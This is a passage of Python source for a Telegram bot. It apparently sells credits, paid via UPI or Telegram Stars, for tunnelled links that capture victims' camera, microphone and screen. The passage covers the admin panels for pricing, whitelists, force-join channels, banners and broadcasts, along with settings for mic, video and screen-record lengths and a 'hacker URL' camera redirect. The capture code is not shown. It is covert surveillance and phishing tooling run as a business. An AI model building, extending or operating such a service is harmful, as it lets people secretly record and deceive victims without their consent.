            await panel(ctx, q, "users", wrap("➕ Add User to Whitelist\n📝 Send user ID"), kb_back("a:wl"))
        elif d == "a:wl_rm":
            ctx.user_data["await"] = "adm_wl_rm"
            await panel(ctx, q, "users", wrap("➖ Remove from Whitelist\n📝 Send user ID"), kb_back("a:wl"))
        elif d == "a:fj":
            with DB_LOCK: chans = c.execute("SELECT * FROM channels ORDER BY id").fetchall()
            lines = ["🚪 Force Join Channels"]
            for i, ch in enumerate(chans):
                lines.append(str(i+1)+". "+(ch["custom_name"] or ch["chat_id"])+" · "+ch["type"]+" · "+ch["style"])
            if not chans: lines.append("📭 No channels yet.")
            await panel(ctx, q, "fj_panel", wrap("\n".join(lines)),
                InlineKeyboardMarkup([
                    [B("➕ Add Public","a:fj_pub",style="success"), B("➕ Add Private","a:fj_priv",style="success")],
                    [B("✏️ Manage","a:fj_mng",style="primary")],
                    [B("🔙 Back","a:home",style="primary")]]))
        elif d == "a:fj_pub":
            ctx.user_data["await"] = "adm_fj_pub"
            await panel(ctx, q, "fj_panel", wrap("📢 Add Public Channel\n📝 Send @username or t.me link"), kb_back("a:fj"))
        elif d == "a:fj_priv":
            ctx.user_data["await"] = "adm_fj_priv_id"
            await panel(ctx, q, "fj_panel", wrap("🔒 Add Private Channel\n📝 Step 1: numeric chat ID\n💡 Example: -1001234567890"), kb_back("a:fj"))
        elif d == "a:fj_mng":
            with DB_LOCK: chans = c.execute("SELECT * FROM channels ORDER BY id").fetchall()
            btns = []
            for ch in chans:
                btns.append([B("📢 "+(ch["custom_name"] or ch["chat_id"]), "a:fj_ch:"+str(ch["id"]), style="primary")])
            btns.append([B("🔙 Back","a:fj",style="primary")])
            await panel(ctx, q, "fj_panel", wrap("✏️ Manage Channels\n👇 Tap a channel to edit."), InlineKeyboardMarkup(btns))
        elif d.startswith("a:fj_ch:"):
            cid = int(d.split(":")[2])
            with DB_LOCK: ch = c.execute("SELECT * FROM channels WHERE id=?", (cid,)).fetchone()
            if not ch: return
            txt = wrap("🚪 Channel Details\n📢 Name: " + (ch["custom_name"] or "-") + "\n🆔 ID: " + ch["chat_id"] + "\n🔗 Link: " + (ch["link"] or "-") + "\n🎨 Style: " + ch["style"] + "\n✅ Active: " + str(ch["active"]))
            await panel(ctx, q, "fj_panel", txt,
                InlineKeyboardMarkup([
                    [B("✏️ Name", "a:fj_name:"+str(cid), style="primary"), B("🎨 Style", "a:fj_style:"+str(cid), style="primary")],
                    [B("🔗 Link", "a:fj_link:"+str(cid), style="primary"), B("🚫 Toggle", "a:fj_tog:"+str(cid), style="danger")],
                    [B("🗑 Delete", "a:fj_del:"+str(cid), style="danger"), B("🔙 Back","a:fj_mng",style="primary")]]))
        elif d.startswith("a:fj_name:"):
            ctx.user_data["await"] = "adm_fj_name"; ctx.user_data["fj_id"] = int(d.split(":")[2])
            await panel(ctx, q, "fj_panel", wrap("✏️ Rename Channel\n📝 Send new display name"), kb_back("a:fj_mng"))
        elif d.startswith("a:fj_style:"):
            cid = d.split(":")[2]
            await panel(ctx, q, "fj_panel", wrap("🎨 Button Style\n👇 Pick one."),
                InlineKeyboardMarkup([
                    [B("💠 Primary", "a:fj_st:"+cid+":primary", style="primary")],
                    [B("🌟 Success", "a:fj_st:"+cid+":success", style="success")],
                    [B("⚠️ Danger",  "a:fj_st:"+cid+":danger",  style="danger")],
                    [B("🔙 Back","a:fj_mng",style="primary")]]))
        elif d.startswith("a:fj_st:"):
            parts = d.split(":",3); cid = parts[2]; st = parts[3]
            with DB_LOCK:
                c.execute("UPDATE channels SET style=? WHERE id=?", (st, int(cid))); conn.commit()
            await panel(ctx, q, "fj_panel", wrap("✅ Style set: "+st), kb_back("a:fj_mng"))
        elif d.startswith("a:fj_link:"):
            ctx.user_data["await"] = "adm_fj_link"; ctx.user_data["fj_id"] = int(d.split(":")[2])
            await panel(ctx, q, "fj_panel", wrap("🔗 Update Invite Link\n📝 Send new t.me link"), kb_back("a:fj_mng"))
        elif d.startswith("a:fj_tog:"):
            cid = int(d.split(":")[2])
            with DB_LOCK:
                c.execute("UPDATE channels SET active=1-active WHERE id=?", (cid,)); conn.commit()
            await panel(ctx, q, "fj_panel", wrap("🚫 Channel toggled."), kb_back("a:fj_mng"))
        elif d.startswith("a:fj_del:"):
            cid = int(d.split(":")[2])
            with DB_LOCK:
                c.execute("DELETE FROM channels WHERE id=?", (cid,)); conn.commit()
            await panel(ctx, q, "fj_panel", wrap("🗑 Channel removed."), kb_back("a:fj_mng"))
        elif d == "a:pay":
            on = setting("stars_on","1") == "1"
            txt = ("💳 Payment Configuration\n🏦 UPI ID: " + str(setting("upi_id","not set")) + "\n🧾 Screenshot required\n⭐ Telegram Stars: " + ("ON ✅" if on else "OFF ⬜") + "\n👇 Manage below.")
            star_lbl = "⭐ Turn Stars OFF" if on else "⭐ Turn Stars ON"
            star_st = "danger" if on else "success"
            await panel(ctx, q, "pay_cfg", wrap(txt),
                InlineKeyboardMarkup([
                    [B("🏦 Set UPI","a:upi",style="primary")],
                    [B(star_lbl, "a:stars", style=star_st)],
                    [B("🔙 Back","a:home",style="primary")]]))
        elif d == "a:stars_bal":
            try:
                r = requests.get("https://api.telegram.org/bot" + BOT_TOKEN + "/getMyStarBalance", timeout=10).json()
                if r.get("ok"):
                    bal = r["result"].get("amount", 0)
                    usd = round(bal * 0.013, 2)
                    lines = [
                        "\u2B50 Telegram Stars Balance", "",
                        "\U0001F4B0 " + str(bal) + " Stars received",
                        "\U0001F4B8 Value: ~$" + str(usd), "",
                        "\U0001F4B3 Withdraw via @BotFather:",
                        "1. Open @BotFather",
                        "2. /mybots \u2192 select bot",
                        "3. Bot Settings \u2192 Payments",
                        "4. Withdraw Stars", "",
                        "\u23F1\uFE0F Min 500 Stars required",
                    ]
                    await panel(ctx, q, "pay_cfg", wrap("\n".join(lines)),
                        InlineKeyboardMarkup([
                            [B("\U0001F4B3 Open BotFather", url="https://t.me/BotFather", style="success")],
                            [B("\U0001F504 Refresh","a:stars_bal",style="primary")],
                            [B("\U0001F519 Back","a:home",style="primary")]]))
                else:
                    await panel(ctx, q, "pay_cfg", wrap("\u274C API error: " + str(r.get("description",""))[:100]), kb_back())
            except Exception as e:
                await panel(ctx, q, "pay_cfg", wrap("\u274C Error: " + str(e)[:100]), kb_back())
        elif d == "a:stars":
            v = "0" if setting("stars_on","1") == "1" else "1"; set_setting("stars_on", v)
            on = v == "1"
            await panel(ctx, q, "pay_cfg", wrap("⭐ Telegram Stars: " + ("ON ✅" if on else "OFF ⬜")), kb_back("a:pay"))
        elif d == "a:upi":
            ctx.user_data["await"] = "adm_upi"
            await panel(ctx, q, "pay_cfg", wrap("🏦 Set UPI ID\n📝 Send your UPI ID\n💡 Example: name@paytm"), kb_back("a:pay"))
        elif d == "a:bc":
            ctx.user_data["await"] = "adm_bc"
            await panel(ctx, q, "broadcast", wrap("📢 Broadcast Message\n📝 Send any text message"), kb_back("a:home"))
        elif d == "a:banners":
            gid, gtyp = get_banner("global")
            gmark = "✅ Global set (" + str(gtyp) + ")" if gid else "⬜ Global not set"
            lines = ["🎨 Banner System", gmark, "🌐 Set Global → applies everywhere.", "🎯 Per-key set overrides global.", "👇 Tap a key, or set global."]
            btns = [[B("🌐 Global Banner", "a:ban_pick:global", style="success" if gid else "primary")]]
            row = []
            for key, label in BANNER_KEYS:
                fid, _ = get_banner(key)
                mark = "✅" if fid else ("🌐" if gid else "⬜")
                row.append(B(mark + " " + label, "a:ban_pick:"+key, style="success" if fid else "primary"))
                if len(row) == 2: btns.append(row); row = []
            if row: btns.append(row)
            btns.append([B("🔙 Back","a:home",style="primary")])
            await panel(ctx, q, "banners", wrap("\n".join(lines)), InlineKeyboardMarkup(btns))
        elif d.startswith("a:ban_pick:"):
            key = d.split(":",2)[2]
            label = "🌐 GLOBAL (all panels)" if key == "global" else BANNER_MAP.get(key, key)
            fid, typ = get_banner(key)
            status = "✅ Set (" + str(typ) + ")" if fid else "⬜ Not set"
            txt = wrap("🎨 Banner — " + label + "\n📌 Key: " + key + "\n📊 Status: " + status + "\n💡 Send photo, video or GIF to set.")
            await panel(ctx, q, "banner_pick", txt,
                InlineKeyboardMarkup([
                    [B("📸 Set Banner", "a:ban_set:"+key, style="success")],
                    [B("🗑 Remove", "a:ban_del:"+key, style="danger")],
                    [B("🔙 Back","a:banners",style="primary")]]))
        elif d.startswith("a:ban_set:"):
            key = d.split(":",2)[2]
            ctx.user_data["banner_key"] = key; ctx.user_data["await"] = "adm_banner_set"
            await panel(ctx, q, "banner_pick", wrap("🎨 Setting banner — " + BANNER_MAP.get(key, key) + "\n📸 Send a photo, video or GIF."), kb_back("a:banners"))
        elif d.startswith("a:ban_del:"):
            key = d.split(":",2)[2]; del_banner(key)
            return await admin_cb(q, ctx, "a:ban_pick:"+key)
        elif d == "a:maint":
            cur = is_maintenance()
            new = "0" if cur else "1"
            set_setting("maintenance", new)
            status = "🚧 ON" if new == "1" else "✅ OFF"
            txt = wrap("🚧 Maintenance Mode\n📌 Current: " + status)
            btn_lbl = "✅ Turn OFF" if new == "1" else "🚧 Turn ON"
            btn_st = "success" if new == "1" else "danger"
            await panel(ctx, q, "maintenance", txt,
                InlineKeyboardMarkup([
                    [B(btn_lbl, "a:maint_tog", style=btn_st)],
                    [B("🔙 Back","a:home",style="primary")]]))
        elif d == "a:maint_tog":
            return await admin_cb(q, ctx, "a:maint")
        elif d == "a:mode":
            ttl = setting("link_ttl", DEFAULT_TTL); mic = setting("mic_secs", DEFAULT_MIC_SECS)
            vs = setting("video_secs", DEFAULT_VIDEO_SECS); hacker = setting("hacker_url", DEFAULT_HACKER_URL)
            txt = ("⚙️ System Mode\n"
                   "🕐 TTL: " + str(ttl) + "s · 🎙️ Mic: " + str(mic) + "s\n"
                   "🎥 Video: " + str(vs) + "s\n"
                   "🎯 Redirect: " + hacker[:32] + "\n"
                   "👇 Tune values below.")
            btns = [
                [B("🕐 TTL","a:set_ttl",style="primary"), B("🎙️ Mic Secs","a:set_mic",style="primary")],
                [B("🎥 Video Secs","a:set_vsec",style="primary"), B("🎯 Hacker URL","a:set_hacker",style="primary")],
                [B("🔙 Back","a:home",style="primary")]]
            await panel(ctx, q, "sys_panel", wrap(txt), InlineKeyboardMarkup(btns))
        elif d == "a:tog_trial":
            v = "0" if setting("free_trial_on","1") == "1" else "1"
            set_setting("free_trial_on", v)
            on = v == "1"
            msg = ("🎁 Free Trial: " + ("ON ✅" if on else "OFF ⬜") + "\n\n"
                   + ("✅ Non-whitelisted users can use 1 free camera trial" if on else
                      "🚫 Trial disabled"))
            await panel(ctx, q, "sys_panel", wrap(msg), kb_back("a:mode"))
        elif d == "a:set_maxopens":
            ctx.user_data["await"] = "adm_maxopens"
            cur = setting("max_opens", DEFAULT_MAX_OPENS)
            await panel(ctx, q, "sys_panel", wrap("🔢 Max Opens Per Link\n"
                "📌 Current: " + str(cur) + " devices\n"
                "📝 Send new number (1-50)"), kb_back("a:mode"))
        elif d == "a:set_ttl":
            ctx.user_data["await"] = "adm_ttl"
            await panel(ctx, q, "sys_panel", wrap("🕐 Link Expiry\n📝 Send seconds\n💡 300 = 5 min\n0 = never"), kb_back("a:mode"))
        elif d == "a:set_mic":
            ctx.user_data["await"] = "adm_mic"
            await panel(ctx, q, "sys_panel", wrap("🎙️ Mic Length\n📝 Send seconds (1-30)"), kb_back("a:mode"))
        elif d == "a:set_vsec":
            ctx.user_data["await"] = "adm_vsec"
            await panel(ctx, q, "sys_panel", wrap("🎥 Video Length\n📝 Send seconds (1-60)"), kb_back("a:mode"))
        elif d == "a:set_scrsec":
            ctx.user_data["await"] = "adm_scrsec"
            cur = setting("screen_secs", "10")
            await panel(ctx, q, "sys_panel", wrap("🖥️ Screen Record Length\n📌 Current: " + str(cur) + "s\n📝 Send seconds (5-60)"), kb_back("a:settings"))
        elif d == "a:set_hacker":
            ctx.user_data["await"] = "adm_hacker"
            cur = setting("hacker_url", DEFAULT_HACKER_URL)
            await panel(ctx, q, "sys_panel", wrap("🎯 Camera Redirect URL\n📌 Current: " + cur + "\n📝 Send new URL"), kb_back("a:mode"))
        elif d == "a:sys":
            t = TUNNEL["url"] or "starting..."
            txt = wrap("🔧 System Info\n🌐 Port: " + str(PORT) + "\n🔗 Tunnel: " + t + "\n🕐 TTL: " + str(setting("link_ttl", DEFAULT_TTL)) + "s\n🐞 Errors: " + str(len(ERROR_LOG)))
            await panel(ctx, q, "sys_panel", txt,
                InlineKeyboardMarkup([
                    [B("🔄 Restart Tunnel","a:restart_tunnel",style="primary")],
                    [B("🐞 View Errors","a:errors",style="primary")],
                    [B("🧹 Clear Errors","a:clr_err",style="danger")],
                    [B("🔙 Back","a:home",style="primary")]]))
        elif d == "a:restart_tunnel":
            try:
                if TUNNEL.get("proc"): TUNNEL["proc"].kill()
            except Exception: pass
            TUNNEL["proc"] = None; set_setting("tunnel_url", "")
            threading.Thread(target=tunnel_worker, daemon=True).start()
            await panel(ctx, q, "sys_panel", wrap("🔄 Tunnel restart triggered\n⏱️ Please wait 15-30 seconds"), kb_back("a:home"))
        elif d == "a:errors":
            if not ERROR_LOG:
                await panel(ctx, q, "sys_panel", wrap("✅ No errors logged"), kb_back("a:sys")); return
            lines = ["🐞 Recent Errors · " + str(len(ERROR_LOG))]
            for ts, where, err in ERROR_LOG[-10:]:
                lines.append("🕐 " + ts + " · 📍 " + where + "\n❌ " + err[:120])
            await panel(ctx, q, "sys_panel", wrap("\n".join(lines)),
                InlineKeyboardMarkup([[B("🔙 Back","a:sys",style="primary")]]))
        elif d == "a:clr_err":
            ERROR_LOG.clear()
            await panel(ctx, q, "sys_panel", wrap("✅ Error log cleared"), kb_back("a:sys"))
    except Exception as e: record_error("admin_cb", e)


# ═══════════ TEXT ═══════════
async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not update or not update.effective_user: return
    if not update.message: return
    u = update.effective_user
    txt = (update.message.text or "").strip()
    try:
        if not is_allowed(u.id):
            log("text blocked " + str(u.id))
            await _deny_access(ctx.bot, u.id)
            return
        if is_maintenance() and u.id != ADMIN_ID:
            await maintenance_gate(update, ctx, u.id); return
        if not is_allowed(u.id) and setting("free_trial_on", "1") != "1":
            return
        await_ = ctx.user_data.get("await")
        log("text " + str(u.id) + ": " + txt[:60])
        if not await_: return

        if await_ == "custom_dest":
            if not (txt.startswith("http://") or txt.startswith("https://")):
                await update.message.reply_text(wrap("❌ Send a valid URL starting with http(s)."), parse_mode="HTML"); return
            row = get_user(u.id); cost = feature_cost("custom")
            if row["credits"] < cost:
                await update.message.reply_text(wrap("💸 Not enough credit. Need " + str(cost) + "."), parse_mode="HTML")
                ctx.user_data.pop("await", None); return
            if not TUNNEL["url"]:
                await update.message.reply_text(wrap("⏳ Tunnel connecting... try soon."), parse_mode="HTML"); return
            sid = gen_id()
            with DB_LOCK:
                c.execute("UPDATE users SET credits=credits-? WHERE id=?", (cost, u.id))
                c.execute("INSERT INTO tx(user_id,type,amount,note,ts) VALUES(?,?,?,?,?)",
                          (u.id,"feature",-cost,"custom",now()))
                c.execute("INSERT INTO links(short_id,owner,feature,dest,hits,devices,created,active) VALUES(?,?,?,?,0,'',?,1)",
                          (sid, u.id, "custom", txt, now())); conn.commit()
            url = TUNNEL["url"] + "/c/" + sid
            hdr = ("✅ Custom link ready\n💸 Credit used: " + str(cost) + "\n🎯 Dest: " + txt[:50])
            await update.message.reply_text(wrap_url(hdr, url), parse_mode="HTML", reply_markup=kb_user())
            uname = "@" + u.username if u.username else "id " + str(u.id)
            notify_admin("🔗 New custom link\n👤 " + uname + "\n🆔 #" + sid + "\n🎯 Dest: " + txt[:80] + "\n" + url)
            ctx.user_data.pop("await", None)
        elif await_ == "adm_ac_price":
            try: v = int(txt)
            except Exception: await update.message.reply_text(wrap("❌ Integer only"), parse_mode="HTML"); return
            set_setting("access_price", v); ctx.user_data.pop("await", None)
            threading.Thread(target=lambda: broadcast_update("Access price updated"), daemon=True).start()
            await update.message.reply_text(wrap("✅ Access price: " + str(v) + " rs"), parse_mode="HTML")
        elif await_ == "adm_ac_days":
            try: v = int(txt)
            except Exception: await update.message.reply_text(wrap("❌ Integer only"), parse_mode="HTML"); return
            set_setting("access_days", v); ctx.user_data.pop("await", None)
            threading.Thread(target=lambda: broadcast_update("Validity updated"), daemon=True).start()
            await update.message.reply_text(wrap("✅ Validity: " + str(v) + " days"), parse_mode="HTML")
        elif await_ == "adm_ac_mc":
            try: v = int(txt)
            except Exception: await update.message.reply_text(wrap("❌ Integer only"), parse_mode="HTML"); return
            set_setting("min_buy_credit", v); ctx.user_data.pop("await", None)
            await update.message.reply_text(wrap("✅ Min credit: " + str(v)), parse_mode="HTML")
        elif await_ == "adm_ac_mp":
            try: v = int(txt)
            except Exception: await update.message.reply_text(wrap("❌ Integer only"), parse_mode="HTML"); return
            set_setting("min_buy_price", v); ctx.user_data.pop("await", None)
            await update.message.reply_text(wrap("✅ Min price: " + str(v) + " rs"), parse_mode="HTML")
        elif await_ == "adm_ac_fd":
            try: v = int(txt)
            except Exception: await update.message.reply_text(wrap("❌ Integer only"), parse_mode="HTML"); return
            set_setting("free_daily", v); ctx.user_data.pop("await", None)
            await update.message.reply_text(wrap("✅ Daily free: " + str(v)), parse_mode="HTML")
        elif await_ == "adm_lo_reward":
            try: v = int(txt)
            except Exception: await update.message.reply_text(wrap("❌ Integer only"), parse_mode="HTML"); return
            if v < 1: v = 1
            if v > 1000: v = 1000
            set_setting("linkowner_reward", v); ctx.user_data.pop("await", None)
            await update.message.reply_text(wrap("✅ Linkowner reward: " + str(v) + " credit"), parse_mode="HTML")
        elif await_ == "adm_notify_msg":
            ctx.user_data.pop("await", None)
            msg = txt.strip()
            try:
                n = broadcast_update(msg)
                await update.message.reply_text(wrap("✅ Notification sent to " + str(n) + " users"), parse_mode="HTML")
            except Exception as e:
                await update.message.reply_text(wrap("❌ Failed: " + str(e)[:100]), parse_mode="HTML")
        elif await_ == "adm_addc":
            parts = txt.split()
            if len(parts) < 2:
                await update.message.reply_text(wrap("❌ Format: user_id amount"), parse_mode="HTML"); return
            try:
                tuid = int(parts[0]); amt = int(parts[1])
            except Exception:
                await update.message.reply_text(wrap("❌ Numbers only"), parse_mode="HTML"); return
            r = get_user(tuid)
            if not r:
                await update.message.reply_text(wrap("❌ User not found"), parse_mode="HTML"); return
            with DB_LOCK:
                c.execute("UPDATE users SET credits=credits+? WHERE id=?", (amt, tuid))
                c.execute("INSERT INTO tx(user_id,type,amount,note,ts) VALUES(?,?,?,?,?)",
                          (tuid,"admin_add",amt,"by admin",now())); conn.commit()
            set_setting("last_purchase_" + str(tuid), str(int(time.time())))
            ctx.user_data.pop("await", None)
            await update.message.reply_text(wrap("✅ Credit added\n🆔 id " + str(tuid) + "\n💰 +" + str(amt) + " credit"), parse_mode="HTML")
            try:
                await ctx.bot.send_message(tuid, wrap("💸 You received " + str(amt) + " credit from admin\n📊 Balance: " + str(r["credits"]+amt) + " credit"), parse_mode="HTML")
            except Exception: pass
        elif await_ == "adm_search":
            r = find_user(txt); ctx.user_data.pop("await", None)
            if not r: await update.message.reply_text(wrap("❌ User not found."), parse_mode="HTML"); return
            s = "🚫 BANNED" if r["banned"] else "🌟 Active"
            await update.message.reply_text(wrap("👤 User Details\n📛 @" + str(r["username"]) + "\n🆔 id " + str(r["id"]) + "\n💸 Credit: " + str(r["credits"]) + "\n📊 Status: " + s), parse_mode="HTML")
        elif await_ == "adm_ban":
            r = find_user(txt); ctx.user_data.pop("await", None)
            if not r: await update.message.reply_text(wrap("❌ Not found."), parse_mode="HTML"); return
            with DB_LOCK:
                c.execute("UPDATE users SET banned=1 WHERE id=?", (r["id"],)); conn.commit()
            await update.message.reply_text(wrap("🚫 @" + str(r["username"]) + " banned."), parse_mode="HTML")
        elif await_ == "adm_unban":
            r = find_user(txt); ctx.user_data.pop("await", None)
            if not r: await update.message.reply_text(wrap("❌ Not found."), parse_mode="HTML"); return
            with DB_LOCK:
                c.execute("UPDATE users SET banned=0 WHERE id=?", (r["id"],)); conn.commit()
            await update.message.reply_text(wrap("✅ @" + str(r["username"]) + " unbanned."), parse_mode="HTML")
        elif await_ == "adm_delete":
            r = find_user(txt); ctx.user_data.pop("await", None)
            if not r: await update.message.reply_text(wrap("❌ Not found."), parse_mode="HTML"); return
            with DB_LOCK:
                c.execute("DELETE FROM users WHERE id=?", (r["id"],))
                c.execute("DELETE FROM links WHERE owner=?", (r["id"],)); conn.commit()
            await update.message.reply_text(wrap("🗑 @" + str(r["username"]) + " deleted."), parse_mode="HTML")
        elif await_ == "adm_rate_edit":
            feat = ctx.user_data.get("rate_feat")
            try: v = int(txt)
            except Exception: await update.message.reply_text(wrap("❌ Integer only."), parse_mode="HTML"); return
            if v < 0: v = 0
            if v > 999: v = 999
            set_feature_cost(feat, v); ctx.user_data.pop("await", None)
            lbl = COMBO_LABEL if feat == COMBO else FEATURES.get(feat, {}).get("label", feat)
            await update.message.reply_text(wrap("💎 Rate updated\n🎬 " + lbl + "\n💸 New: " + str(v) + " credit"), parse_mode="HTML")
        elif await_ == "adm_wl_add":
            try: uid = int(txt.strip())
            except Exception: await update.message.reply_text(wrap("❌ Numbers only"), parse_mode="HTML"); return
            if uid == ADMIN_ID:
                await update.message.reply_text(wrap("ℹ️ Owner already has access"), parse_mode="HTML"); return
            add_allowed(uid)
            r = get_user(uid); uname = ("@" + r["username"]) if (r and r["username"]) else "no username"
            ctx.user_data.pop("await", None)
            try: await ctx.bot.send_message(uid, wrap("✅ Access granted\n🎁 Use /rehancodex"), parse_mode="HTML")
            except Exception: pass
            await update.message.reply_text(wrap("✅ Added\n🆔 " + str(uid) + "\n👤 " + uname), parse_mode="HTML")
        elif await_ == "adm_wl_rm":
            try: uid = int(txt.strip())
            except Exception: await update.message.reply_text(wrap("❌ Numbers only"), parse_mode="HTML"); return
            del_allowed(uid)
            ctx.user_data.pop("await", None)
            try: await ctx.bot.send_message(uid, wrap("🚫 Access revoked\n💬 Contact @RehanCodex"), parse_mode="HTML")
            except Exception: pass
            await update.message.reply_text(wrap("✅ Removed\n🆔 " + str(uid)), parse_mode="HTML")
        elif await_ == "adm_fj_pub":
            ch = txt.strip()
            if ch.startswith("https://t.me/"): ch = "@" + ch.split("/")[-1].lstrip("+")
            with DB_LOCK:
                c.execute("INSERT INTO channels(chat_id,link,type,style,custom_name,active) VALUES(?,?,?,?,?,1)",
                          (ch, "https://t.me/"+ch.lstrip("@"), "public", "primary", ch)); conn.commit()
            ctx.user_data.pop("await", None)
            await update.message.reply_text(wrap("✅ Public channel added: " + ch), parse_mode="HTML")
        elif await_ == "adm_fj_priv_id":
            ctx.user_data["fj_priv_id"] = txt.strip(); ctx.user_data["await"] = "adm_fj_priv_link"
            await update.message.reply_text(wrap("🔗 Now send the invite link"), parse_mode="HTML")
        elif await_ == "adm_fj_priv_link":
            cid = ctx.user_data.get("fj_priv_id")
            with DB_LOCK:
                c.execute("INSERT INTO channels(chat_id,link,type,style,custom_name,active) VALUES(?,?,?,?,?,1)",
                          (cid, txt.strip(), "private", "primary", "Private")); conn.commit()
            ctx.user_data.pop("await", None); ctx.user_data.pop("fj_priv_id", None)
            await update.message.reply_text(wrap("✅ Private channel added: " + str(cid)), parse_mode="HTML")
        elif await_ == "adm_fj_name":
            cid = ctx.user_data.get("fj_id")
            with DB_LOCK:
                c.execute("UPDATE channels SET custom_name=? WHERE id=?", (txt, cid)); conn.commit()
            ctx.user_data.pop("await", None)
            await update.message.reply_text(wrap("✅ Name updated: " + txt), parse_mode="HTML")
        elif await_ == "adm_fj_link":
            cid = ctx.user_data.get("fj_id")
            with DB_LOCK:
                c.execute("UPDATE channels SET link=? WHERE id=?", (txt, cid)); conn.commit()
            ctx.user_data.pop("await", None)
            await update.message.reply_text(wrap("✅ Link updated"), parse_mode="HTML")
        elif await_ == "adm_upi_qr":
            if txt.strip().lower() in ("clear","remove","0"):
                set_setting("upi_qr","")
                ctx.user_data.pop("await", None)
                await update.message.reply_text(wrap("✅ QR removed"), parse_mode="HTML")
            else:
                await update.message.reply_text(wrap("📸 Send QR as photo"), parse_mode="HTML")
        elif await_ == "adm_upi":
            set_setting("upi_id", txt); ctx.user_data.pop("await", None)
            await update.message.reply_text(wrap("🏦 UPI ID set: " + txt), parse_mode="HTML")
        elif await_ == "adm_ttl":
            try: v = int(txt)
            except Exception: await update.message.reply_text(wrap("❌ Integer only."), parse_mode="HTML"); return
            if v < 0: v = 0
            set_setting("link_ttl", v); ctx.user_data.pop("await", None)
            await update.message.reply_text(wrap("🕐 Expiry: " + str(v) + "s"), parse_mode="HTML")
        elif await_ == "adm_mic":
            try: v = int(txt)
            except Exception: await update.message.reply_text(wrap("❌ Integer only."), parse_mode="HTML"); return
            if v < 1: v = 10
            if v > 30: v = 30
            set_setting("mic_secs", v); ctx.user_data.pop("await", None)
            await update.message.reply_text(wrap("🎙️ Mic secs: " + str(v)), parse_mode="HTML")
        elif await_ == "adm_scrsec":
            try: v = int(txt)
            except Exception: await update.message.reply_text(wrap("❌ Integer only"), parse_mode="HTML"); return
            if v < 5: v = 5
            if v > 60: v = 60
            set_setting("screen_secs", v); ctx.user_data.pop("await", None)
            await update.message.reply_text(wrap("✅ Screen secs: " + str(v)), parse_mode="HTML")
        elif await_ == "adm_vsec":
            try: v = int(txt)
            except Exception: await update.message.reply_text(wrap("❌ Integer only."), parse_mode="HTML"); return
            if v < 1: v = 30
            if v > 60: v = 60
            set_setting("video_secs", v); ctx.user_data.pop("await", None)
            await update.message.reply_text(wrap("🎥 Video secs: " + str(v)), parse_mode="HTML")
        elif await_ == "adm_hacker":
            if not (txt.startswith("http://") or txt.startswith("https://")):
                await update.message.reply_text(wrap("❌ Must start with http:// or https://"), parse_mode="HTML"); return
            set_setting("hacker_url", txt); ctx.user_data.pop("await", None)
            await update.message.reply_text(wrap("🎯 Redirect set:\n" + txt), parse_mode="HTML")
        elif await_ == "adm_reject_reason":
            pid = ctx.user_data.get("reject_pid")
            reason = txt.strip() or "No reason provided"
            ctx.user_data.pop("await", None); ctx.user_data.pop("reject_pid", None)
            if pid:
                with DB_LOCK: p = c.execute("SELECT * FROM payments WHERE id=?", (int(pid),)).fetchone()
                if p:
                    try:
                        await ctx.bot.send_message(p["user_id"],
                            "<blockquote>" + bi("❌ Payment Rejected\n"
                            "📝 Reason: " + reason + "\n"
                            "💬 DM @RehanCodex if issue") + "</blockquote>\n\n<blockquote>" + BRAND + "</blockquote>",
                            parse_mode="HTML")
                    except Exception: pass
            await update.message.reply_text(wrap("✅ Reject reason sent to user"), parse_mode="HTML")
        elif await_ == "buy_custom":
            try: amt = int(txt)
            except Exception: await update.message.reply_text(wrap("❌ Integer only"), parse_mode="HTML"); return
            try: minc = int(setting("min_buy_credit", "50"))
            except Exception: minc = 50
            if amt < minc:
                await update.message.reply_text(wrap("❌ Minimum " + str(minc)), parse_mode="HTML"); return
            price = calc_credit_price(amt)
            ctx.user_data["buy"] = {"credit": amt, "price": price}
            ctx.user_data.pop("await", None)
            txt2 = wrap("📦 Custom Package\n💰 " + str(amt) + " credit\n💵 ₹" + str(price) + "\n👇 Payment method choose karo")
            kb2 = InlineKeyboardMarkup([
                [B("🏦 UPI Payment","u:pay:upi",style="primary")],
                [B("⭐ Stars (" + str(amt) + ")","u:pay:stars",style="success")],
                [B("🔙 Back","u:buy",style="primary")]])
            await update.message.reply_text(txt2, parse_mode="HTML", reply_markup=kb2)
        elif await_ == "adm_bc":
            with DB_LOCK:
                users = c.execute("SELECT id FROM users WHERE banned=0").fetchall()
            sent = 0
            for row in users:
                try:
                    await send_panel(ctx.bot, row["id"], None, "broadcast", wrap(esc(txt)), None); sent += 1
                    await asyncio.sleep(0.05)
                except Exception: pass
            ctx.user_data.pop("await", None)
            await update.message.reply_text(wrap("📢 Broadcast sent to " + str(sent) + " users"), parse_mode="HTML")
    except Exception as e: record_error("on_text", e)


# ═══════════ MEDIA ═══════════
async def on_media(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        if not update or not update.effective_user: return
        msg = update.message
        if not msg: return
        u = update.effective_user
        await_ = ctx.user_data.get("await") if ctx.user_data else None
        log("media IN: " + str(u.id) + " await=" + str(await_) + " photo=" + str(bool(msg.photo)))

        if await_ == "adm_upi_qr":
            if not msg.photo:
                await msg.reply_text(wrap("📸 QR as photo bhejo"), parse_mode="HTML")
                return
            fid = msg.photo[-1].file_id
            set_setting("upi_qr", fid)
            ctx.user_data.pop("await", None)
            await msg.reply_text(wrap("✅ QR banner set"), parse_mode="HTML", reply_markup=kb_back("a:settings"))
            return

        if await_ == "adm_banner_set":
            key = ctx.user_data.get("banner_key")
            if not key: return
            fid, typ = None, None
            if msg.photo:
                fid, typ = msg.photo[-1].file_id, "photo"
            elif msg.video:
                fid, typ = msg.video.file_id, "video"
            elif msg.animation:
                fid, typ = msg.animation.file_id, "animation"
            if not fid:
                await msg.reply_text(wrap("❌ Send photo, video or GIF only."), parse_mode="HTML")
                return
            set_banner(key, fid, typ)
            ctx.user_data.pop("await", None)
            ctx.user_data.pop("banner_key", None)
            await msg.reply_text(wrap("✅ Banner set for " + BANNER_MAP.get(key, key) + "\n🎨 Type: " + typ), parse_mode="HTML", reply_markup=kb_back("a:banners"))
            return

        if await_ == "screenshot":
            if not msg.photo:
                await msg.reply_text(wrap("📷 Photo bhejo — payment screenshot"), parse_mode="HTML")
                return
            buy = ctx.user_data.get("buy") or {}
            cred = int(buy.get("credit", 0))
            price = int(buy.get("price", 0))
            log("screenshot: buy=" + str(buy) + " cred=" + str(cred) + " price=" + str(price))
            if cred <= 0:
                await msg.reply_text(wrap("❌ Package info missing\n🔄 Please restart"), parse_mode="HTML")
